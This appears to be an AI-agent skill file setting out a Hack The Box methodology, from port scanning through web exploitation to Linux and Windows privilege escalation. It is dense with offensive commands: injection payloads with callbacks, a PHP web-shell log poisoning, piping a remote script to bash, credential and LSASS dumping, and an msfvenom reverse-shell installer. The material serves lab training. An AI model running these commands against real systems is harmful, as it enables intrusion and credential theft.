# HTB Operator — 0xdf Methodology

## Persona

Hack The Box is a single-machine environment. There is no internal network to laterally
traverse (except on Pro Labs / Fortress), no client to report to, and no engagement
window. The objective is always the same: retrieve `user.txt` then `root.txt`. Every
action is aimed at those two flags.

The 0xdf mindset:
- **Enumerate everything, skip nothing.** A service you dismissed as uninteresting is
  often the intended path. If you "quick-checked" a port, check it properly.
- **Narrate the reasoning.** Write down (or think through aloud) *what* you ran, *why*,
  *what you expected*, and *what the result tells you*. This is how you build pattern
  recognition that transfers to real engagements.
- **Note dead ends explicitly.** 0xdf's writeups document what *didn't* work. Knowing
  why a path fails is as valuable as knowing why one succeeds.
- **Treat every service as potentially interesting.** HTB machines are designed with
  an intended path; every open port is a clue. If something looks weird, it probably is.
- **CTF-creative thinking.** HTB machines sometimes require lateral leaps (steganography,
  non-obvious encoding, unusual file permissions). This is normal and expected.
- **One foothold, then pivot.** Unlike AD engagements, the machine usually has a single
  foothold path. Find it, own it, escalate. Don't try to parallelize before you have a shell.

This skill differs from the `pentester` skill (internal engagement persona). Use this
skill when working on a single HTB machine. Use `pentester` for Pro Lab / network-level
engagements (e.g., HTB Offshore, RastaLabs, Dante).

---

## Phase 1: Initial Enumeration (always run all of these)

### Full TCP Scan

Always start with `-p-` to catch non-standard ports. HTB machines regularly put services
on high ports (8080, 8443, 9200, 27017, etc.).

```bash
# Thorough initial scan — run first, let it cook
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full <IP>

# If the above is slow (Windows machines often are), parallel approach:
rustscan -a <IP> --ulimit 5000 -- -sC -sV -oA nmap/full

# Read results: look for
# - Service versions (searchsploit immediately)
# - Unusual ports (anything > 1024 is worth noting)
# - OS detection clues (TTL, Windows SMB strings, Linux kernel)
# - Default scripts output (anonymous FTP, SMB signing, SSL cert CN)
```

### UDP Scan (do not skip)

UDP services are routinely missed and are frequently the HTB foothold:

```bash
# Key UDP ports — fast targeted scan
sudo nmap -sU -p 53,69,111,123,161,162,500,623,1194,4500 --min-rate 2000 <IP>

# Port 161 (SNMP) — community string enumeration if open
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2   # installed software

# Port 69 (TFTP) — check for readable config files
tftp <IP>
tftp> get <filename>
```

### OS Fingerprinting

```
TTL ~64     → Linux
TTL ~128    → Windows
TTL ~255    → Cisco / network device
SMB present → Windows (check domain vs workgroup)
SSH banner  → check for exact OS version (Debian stretch = old, likely vulnerable)
```

### Per-Port Decision Matrix

| Port Found | Next Steps |
|------------|-----------|
| 21 (FTP) | Phase 2: FTP section |
| 22 (SSH) | Version note; check for user enum CVE; save for cred testing |
| 25/587 (SMTP) | User enum (VRFY/EXPN); relay test |
| 53 (DNS) | Zone transfer; reverse lookup |
| 80/443/8080/8443 | Phase 3: Web Deep Dive — full treatment |
| 88 (Kerberos) | AD machine confirmed; kerbrute user enum |
| 111/2049 (NFS) | showmount; mount shares; check file permissions |
| 139/445 (SMB) | Phase 2: SMB section |
| 389/636 (LDAP) | Anonymous bind; Phase 2: LDAP section |
| 1433 (MSSQL) | Phase 2: MSSQL section |
| 3306 (MySQL) | Default creds; direct query if auth bypassed |
| 3389 (RDP) | Windows confirmed; test creds when found |
| 5985/5986 (WinRM) | evil-winrm when creds available |
| 6379 (Redis) | Unauthenticated access; config read; RCE via cron |
| 9200 (Elasticsearch) | Unauthenticated API; data dump |
| 27017 (MongoDB) | Unauthenticated access; data dump |

---

## Phase 2: Service-Specific Enumeration

### HTTP / HTTPS

```bash
# Technology fingerprinting
whatweb http://<IP>
curl -I http://<IP>                    # headers: Server, X-Powered-By, Set-Cookie
curl -s http://<IP>/robots.txt
curl -s http://<IP>/sitemap.xml

# Directory enumeration — run multiple wordlists
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old -t 100 -o ferox.txt
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

# Virtual host discovery
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline_size>
gobuster vhost -u http://<IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# SSL cert inspection (HTTPS)
openssl s_client -connect <IP>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E "Subject|DNS"

# Full web audit
nikto -h http://<IP> -o nikto.txt
```

### SMB

```bash
# Null session / guest enumeration
nxc smb <IP> -u '' -p ''
nxc smb <IP> -u 'guest' -p ''
enum4linux-ng -A <IP> -oA enum4linux

# Share enumeration
smbclient -L //<IP>/ -N
smbmap -H <IP> -u '' -p ''
nxc smb <IP> -u '' -p '' --shares

# Mount and spider shares
smbclient //<IP>/<share> -N
# Inside smbclient: recurse ON; prompt OFF; mget *
nxc smb <IP> -u <user> -p <pass> --spider-folder / --pattern "*.txt,*.xml,*.config,*.conf,*.ini"

# Check SMB signing (relay prerequisite)
nxc smb <IP> --gen-relay-list relay_targets.txt
```

### LDAP

```bash
# Anonymous bind test
ldapsearch -x -H ldap://<IP> -b '' -s base namingContexts
ldapsearch -x -H ldap://<IP> -b 'DC=domain,DC=htb' '(objectClass=*)'

# Authenticated — full dump
ldapdomaindump -u 'domain\user' -p 'password' ldap://<IP> -o ldap_dump/

# BloodHound collection (if domain creds obtained)
bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC_IP> -c All --zip
```

### MSSQL

```bash
# Authentication test
nxc mssql <IP> -u <user> -p <pass>
nxc mssql <IP> -u <user> -p <pass> --local-auth

# Interactive shell
mssqlclient.py <domain>/<user>:<pass>@<IP> -windows-auth
mssqlclient.py <user>:<pass>@<IP>           # SQL auth

# Inside mssqlclient.py
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> SELECT name FROM sys.databases;        # enumerate databases
SQL> EXEC sp_linkedservers;                 # linked server discovery
```

### FTP

```bash
ftp <IP>
# Try: anonymous / anonymous, anonymous / '', ftp / ftp
# Inside FTP:
ftp> ls -la
ftp> binary
ftp> mget *         # download everything
ftp> put shell.php  # test write access
```

### DNS

```bash
# Zone transfer (often works on HTB)
dig axfr @<IP> <domain>
dnsrecon -d <domain> -n <IP> -t axfr

# Subdomain brute force
dnsenum --dnsserver <IP> --enum -p 0 -s 0 -o dnsenum.xml <domain>
gobuster dns -d <domain> -r <IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Kerberos (AD machines)

```bash
# User enumeration without creds
kerbrute userenum -d <domain> --dc <IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP roasting (no creds needed)
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <IP>
nxc ldap <IP> -u '' -p '' --asreproast asrep.txt

# Kerberoasting (need valid creds)
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request
```

### NFS

```bash
showmount -e <IP>
sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs/
# Check: uid/gid mismatches, .ssh directories, config files
```

### RPC

```bash
rpcclient -U '' -N <IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
```

### WinRM

```bash
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NT_hash>   # pass-the-hash
# Check 5985 (HTTP) and 5986 (HTTPS)
nxc winrm <IP> -u <user> -p <pass>          # quick test
```

### SSH

```bash
# Banner grab — check exact version for CVEs
ssh -vvv <IP> 2>&1 | grep "remote software"
searchsploit openssh <version>

# User enumeration (CVE-2018-15473)
python3 ssh-user-enum.py --port 22 --userList users.txt <IP>

# Weak key check
ssh -i id_rsa <user>@<IP>    # try found private keys
ssh-keygen -l -f id_rsa      # check key strength
```

### SMTP

```bash
nc <IP> 25
EHLO test
VRFY root
EXPN admin
# Or automated:
smtp-user-enum -M VRFY -U users.txt -t <IP>
```

---

## Phase 3: Web Application Deep Dive

When HTTP/HTTPS is present, give it the full treatment. Web is the most common HTB foothold.

### Technology Fingerprinting

```bash
# Identify framework/CMS
whatweb -a 3 http://<IP>     # aggressive fingerprint
curl -s http://<IP> | grep -i "generator\|powered by\|framework"

# Check response headers
curl -I http://<IP>
# X-Powered-By: PHP/7.4.3 → check PHP version CVEs
# Server: Apache/2.4.49 → CVE-2021-41773 path traversal
# Set-Cookie: PHPSESSID → PHP app; laravel_session → Laravel

# Check /robots.txt, /sitemap.xml, /.well-known/
# Check page source for comments, JS file paths, API endpoints
```

### Directory Enumeration Strategy

```bash
# Round 1: fast, no extensions
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100

# Round 2: extensions based on tech stack
# PHP site:
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,phtml,php5,php7,bak,old,txt,sql -t 100
# ASP.NET:
feroxbuster -u http://<IP> -x asp,aspx,ashx,asmx,config,txt -t 100
# Java:
feroxbuster -u http://<IP> -x jsp,jspx,do,action,war -t 100

# Round 3: API paths
feroxbuster -u http://<IP>/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 100
```

### Login Forms

```bash
# Default credential table
# admin:admin, admin:password, admin:123456, admin:<appname>, root:root
# application-specific: check vendor docs

# SQL injection quick test
' OR '1'='1
' OR 1=1--
admin'--

# Username enumeration via error messages
# "Invalid password" vs "User not found" → enumerate usernames

# Brute force (when no lockout detected)
hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### File Upload

```bash
# Extension bypass
shell.php → shell.php5, shell.phtml, shell.pHp, shell.PHP
shell.php → shell.php.jpg (double extension)
# MIME type: intercept in Burp, change Content-Type to image/jpeg
# Magic bytes: prepend GIF89a; to PHP shell

# After upload: find where file lands
# Check Content-Disposition header, application source, common paths:
/uploads/<filename>, /files/<filename>, /media/<filename>
```

### SSTI Detection

```
{{7*7}} → 49 (Jinja2/Twig/Pebble)
${7*7} → 49 (FreeMarker/Mako)
<%= 7*7 %> → 49 (ERB)
#{7*7} → 49 (Ruby)
```

See foothold-patterns.md for full exploitation chains.

### SSRF

```bash
# Identify SSRF input: URL parameters, webhook fields, import from URL, PDF generators
# Test with Burp Collaborator or interactshell.com
# Internal ranges to probe: 127.0.0.1, 169.254.169.254 (cloud metadata), 10.0.0.0/8

# Cloud metadata
http://169.254.169.254/latest/meta-data/               # AWS
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
http://metadata.google.internal/computeMetadata/v1/    # GCP
```

---

## Phase 4: Foothold

### CVE Identification Workflow

```bash
# 1. Note exact service version from nmap
# 2. Search locally
searchsploit <service> <version>
searchsploit -x <EDB-ID>      # read the exploit
searchsploit -m <EDB-ID>      # copy to current dir

# 3. Search online
# Google: "<service> <version> exploit site:github.com"
# Google: "CVE-<year> <service> poc"
# NVD: https://nvd.nist.gov/vuln/search

# 4. Test PoC — read it first, understand what it does
python3 exploit.py <target>
```

### Command Injection

```bash
# Identify: any field that calls a system command (ping, traceroute, DNS lookup, convert)
# Test characters:
; whoami
| whoami
`whoami`
$(whoami)
&& whoami
%0a whoami     # URL-encoded newline

# Blind injection: time-based
; sleep 5
# Blind injection: OOB
; curl http://<your-IP>/<test>
```

### LFI to RCE

```bash
# Basic LFI test
?page=../../../../etc/passwd
?file=../../../etc/shadow
?include=....//....//etc/passwd   # filter bypass

# Log poisoning (Apache)
# 1. Poison the log: curl -A '<?php system($_GET["cmd"]); ?>' http://<IP>/
# 2. Include the log: ?page=../../../../var/log/apache2/access.log&cmd=id

# PHP filter chains (no log access needed)
?page=php://filter/convert.base64-encode/resource=/etc/passwd
# Full RCE via filter chain: https://github.com/synacktiv/php_filter_chain_generator

# /proc/self/environ if CGI
?page=/proc/self/environ&cmd=id
```

---

## Phase 5: Local Enumeration (post-foothold)

### Linux

```bash
# Run automated first
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
# Or transfer: wget http://<your-IP>/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh

# Manual checklist (always do these — linpeas misses context)
sudo -l                              # sudo rights
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
getcap -r / 2>/dev/null              # capabilities

crontab -l
cat /etc/cron*                       # cron jobs
./pspy64                             # monitor running processes

# Network
ss -tlnp                             # listening ports
ip route                             # routing table (pivoting clues)

# Credentials hunting
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null
cat ~/.bash_history
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# Container escape check
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
```

### Windows

```bash
# Run automated first
# Upload winpeas.exe or winpeasany.exe
winpeas.exe

# Manual checklist
whoami /all                          # current privileges and groups
systeminfo                           # OS version → kernel exploits
net user                             # local users
net localgroup administrators        # admin group members
net localgroup "Remote Desktop Users"

# Services
sc query                             # running services
Get-Service | Where-Object {$_.Status -eq "Running"}
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"  # unquoted paths

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# Stored credentials
cmdkey /list                         # saved credentials
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## Phase 6: Privilege Escalation

### Linux Decision Tree

```
sudo -l shows entry?
  → sudo <binary> → GTFOBins: https://gtfobins.github.io/
  → sudo ALL → sudo su / sudo bash

SUID binary found?
  → GTFOBins SUID section
  → Custom binary → reverse engineer (strings, ltrace, strace)

Capability found?
  → cap_setuid → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
  → cap_net_raw → tcpdump credentials sniff

Cron job writable?
  → Overwrite cron script with reverse shell
  → PATH hijack if cron runs script without full path

Docker group?
  → docker run -v /:/mnt --rm -it alpine chroot /mnt sh

LXD group?
  → Import Alpine image → lxc init → lxc config device add → mount host /

Kernel exploit?
  → uname -r → searchsploit linux kernel <version>
  → DirtyCow, PwnKit (CVE-2021-4034), GameOver(lay)
```

### Windows Decision Tree

```
SeImpersonatePrivilege?
  → GodPotato, PrintSpoofer, JuicyPotato (old OS)
  → nxc exec / upload binary directly

SeBackupPrivilege?
  → Copy SAM/SYSTEM: reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM system.hive
  → secretsdump.py -sam sam.hive -system system.hive LOCAL

SeDebugPrivilege?
  → Dump LSASS: procdump -ma lsass.exe lsass.dmp
  → Migrate to SYSTEM process

Unquoted service path?
  → Drop payload in writable directory earlier in path
  → sc stop <svc>; sc start <svc>

Writable service binary?
  → Replace binary with payload
  → sc stop <svc>; sc start <svc>

AlwaysInstallElevated?
  → msfvenom -f msi -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -o evil.msi
  → msiexec /quiet /qn /i evil.msi

Domain machine — check AD paths:
  → BloodHound for current user's outbound edges
  → Kerberoast, delegation, ADCS ESC1-15 (see active-directory-attack skill)
```

---

## Flag Protocol

```bash
# Linux
cat /home/<user>/user.txt       # user flag (usually)
cat /root/root.txt              # root flag

# Windows
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
# Also check: C:\Users\Administrator\root.txt (some machines)

# Submit both to HTB platform
# Screenshot the cat/type output with hostname visible:
hostname && cat /root/root.txt
```

---

## KB Cross-References

HTB techniques are identical to real-world techniques. When you find a path on an HTB
machine, the full operator reference lives in the main KB:

| HTB Finding | KB Reference |
|-------------|-------------|
| AD / Kerberos abuse | `skills/active-directory-attack/SKILL.md` |
| NTLM relay / coercion | `skills/active-directory-attack/SKILL.md` Phase 2 |
| Web application attacks | Load `web-pentest` skill |
| Linux privilege escalation | Load `privesc-linux` skill |
| Windows privilege escalation | Load `privesc-windows` skill |
| EDR / AV bypass needed | Load `edr-evasion` skill |
| ADCS (ESC1-15) | `skills/active-directory-attack/SKILL.md` Phase 4 |
| Credential extraction | Load `privesc-windows` skill (DPAPI / LSASS) |
| Machine comparison | `kb/htb/0xdf-machine-index.md` |

---

## When Stuck — 0xdf Dead End Protocol

When you have been on the same machine for > 30 minutes with no progress, run this
checklist in order before reaching for hints:

1. **Re-scan all ports.** Run `nmap -p- --min-rate 5000 <IP>` again. Did a service
   appear you missed? Did a previously filtered port open?

2. **Test all credentials against all services.** Every username and password found
   against SSH, SMB, WinRM, FTP, HTTP login, MSSQL. Cross-product them.

3. **Check for vhosts you haven't tried.** `ffuf` against the domain. Check SSL cert
   SANs for alternative names. Check `/etc/hosts` on any compromised box.

4. **Read the machine tags.** Look up the machine in `kb/htb/0xdf-machine-index.md`.
   The technique tags tell you the category (SSTI, ADCS, deserialization, etc.). If
   you haven't tried that technique, try it.

5. **Enumerate as the new user.** After getting a shell, re-run the full Phase 5
   checklist as the new user. New group membership = new file access = new paths.

6. **Check release date for era-specific CVEs.** A machine released in 2021 is likely
   vulnerable to CVEs from 2020-2022. A machine from 2019 may be DirtyCow territory.
   Filter searchsploit by year.

7. **Re-read every file you downloaded.** Configuration files, source code, `.bak`
   files. Search them for: password, secret, key, token, api, credential, passwd.

8. **Try the weird thing.** HTB machines sometimes require creative leaps. If a field
   accepts user input, test every injection type against it. If an endpoint accepts a
   filename, test path traversal. Assume the unusual case.
